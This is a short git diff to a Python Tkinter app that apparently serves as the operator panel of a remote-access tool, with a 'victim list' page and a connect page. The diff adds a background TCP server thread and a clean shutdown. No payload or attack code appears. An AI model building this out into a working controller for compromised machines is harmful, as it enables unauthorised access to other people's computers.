@@ -4,6 +4,9 @@ import pyautogui
 import os
 import json
 import datetime
+import threading
+from mysocket import MySocket
+
 
 logger = []
 
@@ -40,6 +43,7 @@ def windowInit():
     width, height, x, y = 900, 400, pyautogui.size().width // 2, pyautogui.size().height // 2
     root.geometry(f"{width}x{height}+{x-width//2}+{y-height//2}")
     root.resizable(False, False)
+    root.protocol("WM_DELETE_WINDOW", windowClosing)
 
     menuBar()
     victimListPage()
@@ -101,7 +105,7 @@ def victimListPage():
     b = ttk.Button(root,text="Send",style="b.TButton")
     b.pack(anchor="e",padx=25)
 
-def A():
+def connect():
     print("A")
 
 def connectPage():
@@ -119,7 +123,7 @@ def connectPage():
         rf = tk.Frame(frame,background="#282626")
         rf.pack(side="right",padx=25)
         e = ttk.Entry(rf,font=("Comic Sans MS", 20)).pack(pady=10)
-        ttk.Button(rf,text="Connect",style="b.TButton",command=A).pack(anchor="e")
+        ttk.Button(rf,text="Connect",style="b.TButton",command=connect).pack(anchor="e")
     clearWindow()
     online()
 
@@ -160,9 +164,18 @@ def writeLog(message):
     log_message = f"《{timestamp}》 {message}"
     logger.append(log_message)
 
+def windowClosing():
+    server.stopTCPServer()
+    TCPserverThread.join()
+    root.destroy()
+    
 def run():
+    global server,TCPserverThread
     windowInit()
     styles()
+    server = MySocket.Server()
+    TCPserverThread = threading.Thread(target=server.startTCPServer)
+    TCPserverThread.start()
     root.mainloop()
 
 if __name__ == "__main__":
